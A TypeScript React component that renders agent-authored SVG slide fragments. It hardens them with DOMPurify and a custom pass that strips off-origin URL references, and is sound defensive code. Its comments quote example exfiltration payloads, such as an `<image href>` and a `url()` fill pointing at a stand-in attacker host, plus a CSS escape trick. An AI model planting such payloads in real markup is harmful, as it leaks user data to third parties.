/**
 * SlidePreview — renders one composed slide as SVG, animating what just changed.
 *
 * The engine's compose step emits a payload of per-component SVG fragments plus
 * each component's bounding box and a `changed` flag. This component assembles
 * them into a single `<svg>` and, when the payload's epoch moves (a recompose),
 * fades in only the changed components so the user can see WHICH parts of the
 * slide the agent just rewrote.
 *
 * Why the SVG is built imperatively rather than as JSX: the fragments are opaque
 * SVG source strings produced by the engine, so they have to be parsed into real
 * nodes.
 *
 * **Every fragment is sanitized through DOMPurify in SVG mode before it is
 * parsed, then walked a second time to strip off-origin URL references**
 * (`setSvgFragment` below). The payload is written by a model driving the engine,
 * and an SVG document can carry `<script>`, `on*` handlers and `<foreignObject>`
 * — so this content is treated exactly like any other untrusted markup the
 * dashboard renders, not trusted because it came from our own backend. The
 * second pass exists because DOMPurify is an XSS filter and not an egress
 * filter: it keeps `<image href>`, and this subtree renders on the dashboard's
 * OWN origin, so a passive cross-origin GET would exfiltrate the deck. The
 * subtree is additionally `pointer-events: none`.
 *
 * Motion respects `prefers-reduced-motion`: the reduced path renders the final
 * state immediately with no staged reveal.
 */

import { useEffect, useRef, useState } from 'react'
import { AlertTriangle } from 'lucide-react'
import DOMPurify from 'dompurify'
import { i18nT } from '../../i18n/t'
import {
  fetchArtifactJson,
  type ComposeDefs,
  type ComposePayload,
} from './api'
import { COMPOSE_VERSION, SLIDE_ASPECT } from './lib'

const SVG_NS = 'http://www.w3.org/2000/svg'

/** Per-component reveal stagger and fade duration (ms). */
const STAGGER_MS = 140
const FADE_MS = 420

/**
 * Sanitize an engine-produced SVG fragment and append it to *element*.
 *
 * DOMPurify's SVG profile strips `<script>`, event-handler attributes,
 * `<foreignObject>` and `javascript:` URLs while leaving legitimate drawing
 * markup intact. This is the ONLY place a fragment becomes DOM, so the sanitize
 * cannot be bypassed by a caller that forgets it.
 *
 * Two non-obvious requirements, both load-bearing (a test pins them):
 *
 * 1. **The fragment must be wrapped in `<svg>` before sanitizing.** A bare
 *    `<rect>`/`<path>` is not valid HTML body content, so DOMPurify parses it in
 *    an HTML context and discards it — sanitizing the fragment directly returns
 *    an EMPTY string and every slide renders blank.
 * 2. **`RETURN_DOM_FRAGMENT`, not a string.** Assigning sanitized SVG source to
 *    `innerHTML` on an SVG element re-parses it in the HTML namespace, producing
 *    HTML-namespaced elements that never paint. Taking the DOM back from
 *    DOMPurify preserves the SVG namespace.
 */
/**
 * A bare `<rect>`/`<path>` is not valid HTML body content, so DOMPurify returns an
 * EMPTY result for it — every slide rendered blank. Wrapping in an `<svg>` root
 * first is what makes the fragment parseable.
 */
const SVG_ROOT_OPEN = '<svg>'
const SVG_ROOT_CLOSE = '</svg>'
const wrapInSvgRoot = (fragment: string): string =>
  SVG_ROOT_OPEN + fragment + SVG_ROOT_CLOSE

/**
 * `RETURN_DOM_FRAGMENT` is load-bearing: assigning sanitized SVG *source* to
 * `innerHTML` re-parses it in the HTML namespace, producing elements that exist
 * in the DOM but never paint.
 */
const SVG_SANITIZE_CONFIG = {
  USE_PROFILES: { svg: true, svgFilters: true },
  RETURN_DOM_FRAGMENT: true,
} as const

/**
 * Second pass: strip every OFF-ORIGIN URL reference from the sanitized subtree.
 *
 * DOMPurify's SVG profile is an XSS filter, not an egress filter. It removes
 * `<script>`, `on*` handlers and `javascript:` URLs, but it deliberately keeps
 * `<image>`, `<feImage>` and the FuncIRI presentation attributes along with their
 * `href` / `xlink:href` values — so a PASSIVE cross-origin GET survives it.
 *
 * That matters here because this subtree lands in the live dashboard DOM, on the
 * dashboard's own origin — not inside a null-origin sandboxed frame the way the
 * style boards in `BoardFrame` are. The dashboard CSP allows `img-src … https:`,
 * so there is no backstop below this walk: an agent-authored
 * `<image href="https://attacker.example/?d=<deck text>">` would exfiltrate the
 * slide's content in the query string the moment it is appended.
 *
 * The rule is an allow-list, so a URL-bearing attribute we have not enumerated
 * still fails closed: a reference may only be a bare same-document `#fragment`.
 * Fragment refs are load-bearing — the deck's shared gradients and symbols live
 * in a separate `defs` payload and every slide reaches them by id — so
 * `fill="url(#grad)"` and `href="#symbolId"` MUST keep working.
 */

/** Attributes whose whole value is one URL reference (`xlink:href` localises here). */
const DIRECT_REF_ATTRS = new Set(['href', 'src'])

/** Every `url(` opener, so a malformed one cannot hide from the ref matcher. */
const URL_FN_TOKEN_RE = /url\s*\(/gi
/** A well-formed `url(…)`, capturing the reference with optional quoting. */
const URL_FN_REF_RE = /url\s*\(\s*(['"]?)([^'")]*)\1\s*\)/gi

/**
 * True for a reference that can only ever resolve inside this document.
 *
 * A leading `#` is what makes that provable: no scheme, authority or
 * protocol-relative `//` prefix can precede it, so a URL parser always resolves
 * the value against the current document. Absolute, protocol-relative and
 * scheme-relative values all fail here.
 */
const isFragmentRef = (value: string): boolean => /^#\S+$/.test(value.trim())

/**
 * Inline raster bitmap, the ONE non-fragment reference `<image>` may carry.
 *
 * This is not a concession — it is load-bearing. The engine's compose step runs
 * every fragment, the background and the shared defs through its image pass,
 * which re-encodes embedded art as `data:image/webp;base64,…`. Rejecting `data:`
 * wholesale would therefore blank every photo, logo and icon in every deck while
 * looking secure — the same class of regression as the two the module header
 * already records.
 *
 * It is also outside the threat model this walk exists for: a data URL is inline
 * bytes, so it issues NO request and cannot carry deck text to a third party.
 * `image/svg+xml` is excluded even so — it is the one subtype that is a document
 * rather than a bitmap, and the engine never emits it.
 */
const DATA_BITMAP_RE = /^data:image\/(?:png|jpeg|jpg|gif|webp|avif|bmp)[;,]/i
const isInlineBitmapRef = (value: string): boolean => DATA_BITMAP_RE.test(value.trim())

/** True when *value* names no URL, or names only same-document fragments.
 *
 * Exported so the `bgFill` guard can be tested directly: that value is set on a
 * `rect` outside `scrubExternalRefs`'s walk, so it needs its own coverage. */
export function urlRefsAreLocal(value: string): boolean {
  const openers = value.match(URL_FN_TOKEN_RE)
  if (!openers) return true
  const refs = Array.from(value.matchAll(URL_FN_REF_RE))
  // A `url(` we could not parse as a complete reference is treated as hostile.
  if (refs.length !== openers.length) return false
  return refs.every((match) => isFragmentRef(match[2]))
}

/** Drop declarations in a `style` attribute that reach off-origin. */
function scrubStyleAttribute(element: Element): void {
  const raw = element.getAttribute('style')
  if (raw === null) return
  // CSS resolves escapes while tokenising, so `\75 rl(…)` is a live `url(` that
  // no scan of the raw text would see. Legitimate presentation styles never need
  // an escape, so their presence retires the whole attribute.
  if (raw.includes('\\')) {
    element.removeAttribute('style')
    return
  }
  const style = (element as SVGElement).style
  if (!style) return
  // Snapshot the names: removing a property renumbers the live declaration list.
  const names: string[] = []
  for (let index = 0; index < style.length; index += 1) names.push(style.item(index))
  for (const name of names) {
    if (!urlRefsAreLocal(style.getPropertyValue(name))) style.removeProperty(name)
  }
}

/**
 * Exported for tests ONLY — `setSvgFragment` is still the sole path a fragment
 * becomes DOM. The test DOM's HTML parser discards `svg > style` and everything
 * after it when parsing a STRING, so the one way to pin the inline-stylesheet
 * rule against the shipped code is to hand this walk the subtree a real browser
 * would have produced.
 */
export function scrubExternalRefs(root: Element): void {
  for (const element of Array.from(root.querySelectorAll('*'))) {
    // An inline stylesheet is a whole CSS grammar — `@import`, `@font-face src`
    // and nested functions all fetch, and none of them carries a `url(` opener
    // we could match on. The engine composes with presentation attributes and
    // never emits one, so dropping the element outright is both safe and the
    // only version of this that is provably complete.
    if (element.localName === 'style') {
      element.remove()
      continue
    }
    for (const attribute of Array.from(element.attributes)) {
      const local = attribute.localName
      const value = attribute.value
      if (local === 'style') continue
      // The inline-bitmap exemption is scoped to `<image>`: only there is a
      // raster reference legitimate. `<feImage>`, `<pattern>`, `<use>` and the
      // gradients get the strict fragment-only rule.
      const allowInlineBitmap = element.localName === 'image'
      const offOrigin = DIRECT_REF_ATTRS.has(local)
        ? !isFragmentRef(value) && !(allowInlineBitmap && isInlineBitmapRef(value))
        : !urlRefsAreLocal(value)
      if (offOrigin) element.removeAttribute(attribute.name)
    }
    scrubStyleAttribute(element)
  }
}

export function setSvgFragment(element: Element, fragment: string): void {
  const sanitized = DOMPurify.sanitize(wrapInSvgRoot(fragment), SVG_SANITIZE_CONFIG)
  const wrapper = sanitized.firstChild as Element | null
  if (!wrapper) return
  // Scrub while the nodes are still detached, so nothing off-origin is ever
  // parented into the live document even briefly.
  scrubExternalRefs(wrapper)
  while (wrapper.firstChild) element.appendChild(wrapper.firstChild)
}

interface SlidePreviewProps {
  /** Server-relative compose payload path; a new value means a new render. */
  composeUrl: string
  /** The deck's shared SVG defs (gradients, symbols), if it has any. */
  defs: ComposeDefs | null
  label: string
}

export default function SlidePreview({ composeUrl, defs, label }: SlidePreviewProps) {
  const hostRef = useRef<HTMLDivElement>(null)
  const defsRef = useRef(defs)
  defsRef.current = defs
  const lastUrlRef = useRef('')
  const timersRef = useRef<number[]>([])
  const [failed, setFailed] = useState(false)

  const defsReady = Boolean(defs?.defs)

  useEffect(() => {
    let cancelled = false
    const clearTimers = () => {
      timersRef.current.forEach((id) => window.clearTimeout(id))
      timersRef.current = []
    }

    const reduced =
      typeof window !== 'undefined' &&
      typeof window.matchMedia === 'function' &&
      window.matchMedia('(prefers-reduced-motion: reduce)').matches

    const render = async () => {
      const isRecompose = Boolean(lastUrlRef.current) && lastUrlRef.current !== composeUrl
      lastUrlRef.current = composeUrl

      let payload: ComposePayload
      try {
        payload = await fetchArtifactJson<ComposePayload>(composeUrl)
      } catch {
        if (!cancelled) {
          // Reset so a later poll retries rather than treating this URL as done.
          lastUrlRef.current = ''
          setFailed(true)
        }
        return
      }
      if (cancelled || !hostRef.current) return
      if (payload.version !== COMPOSE_VERSION) {
        setFailed(true)
        return
      }
      setFailed(false)
      clearTimers()

      const viewBox = payload.viewBox || '0 0 1920 1080'
      const [, , vbWidth, vbHeight] = viewBox.split(' ').map(Number)

      const svg = document.createElementNS(SVG_NS, 'svg')
      svg.setAttribute('viewBox', viewBox)
      svg.setAttribute('preserveAspectRatio', 'xMidYMid')
      svg.setAttribute('role', 'img')
      svg.setAttribute('aria-label', label)
      svg.style.width = '100%'
      svg.style.height = '100%'
      svg.style.pointerEvents = 'none'

      if (payload.bgSvg) {
        const background = document.createElementNS(SVG_NS, 'g')
        setSvgFragment(background, payload.bgSvg)
        svg.appendChild(background)
      } else {
        const rect = document.createElementNS(SVG_NS, 'rect')
        rect.setAttribute('width', String(vbWidth || 1920))
        rect.setAttribute('height', String(vbHeight || 1080))
        // `bgFill` is agent-authored like every other field in the payload, and it
        // is set DIRECTLY here rather than passing through `scrubExternalRefs` —
        // which is exactly how it slipped past the SVG hardening. A `fill` accepts
        // a FuncIRI, so `url(https://attacker/?d=…)` here is a live GET carrying
        // deck data off-origin. Same rule as every other URL-bearing value: a
        // same-document `url(#…)` is fine (a gradient from `defs`), anything else
        // falls back to transparent.
        const bgFill = payload.bgFill || ''
        rect.setAttribute(
          'fill',
          bgFill && urlRefsAreLocal(bgFill) ? bgFill : 'transparent',
        )
        svg.appendChild(rect)
      }

      if (defsRef.current?.defs) {
        const holder = document.createElementNS(SVG_NS, 'g')
        setSvgFragment(holder, defsRef.current.defs)
        while (holder.firstChild) svg.appendChild(holder.firstChild)
      }

      // Only animate on a RECOMPOSE, and only the components the engine marked
      // changed. A first render animating everything would make simply opening a
      // finished deck look like it was being rebuilt.
      const animate = isRecompose && !reduced
      const groups: SVGGElement[] = []
      const components = payload.components || []
      components.forEach((component) => {
        const group = document.createElementNS(SVG_NS, 'g')
        setSvgFragment(group, component.svg || '')
        const willAnimate = animate && Boolean(component.changed)
        group.style.opacity = willAnimate ? '0' : '1'
        if (willAnimate) group.style.transition = `opacity ${FADE_MS}ms ease-out`
        svg.appendChild(group)
        groups.push(group)
      })

      hostRef.current.replaceChildren(svg)

      if (!animate) return
      let step = 0
      components.forEach((component, index) => {
        if (!component.changed) return
        const group = groups[index]
        const delay = step * STAGGER_MS
        step += 1
        timersRef.current.push(
          window.setTimeout(() => {
            if (cancelled) return
            group.style.opacity = '1'
          }, delay),
        )
      })
    }

    void render()
    return () => {
      cancelled = true
      clearTimers()
    }
  }, [composeUrl, defsReady, label])

  return (
    <div
      className="relative w-full rounded-lg overflow-hidden border border-border bg-bg-elevated"
      style={{ paddingBottom: SLIDE_ASPECT }}
    >
      <div ref={hostRef} className="absolute inset-0" />
      {failed && (
        <div className="absolute inset-0 flex items-center justify-center gap-1.5 text-[12px] text-muted">
          <AlertTriangle className="lucide-inline" />
          {i18nT('apps.pptxMaker.slidePreview.preview_unavailable')}
        </div>
      )}
    </div>
  )
}
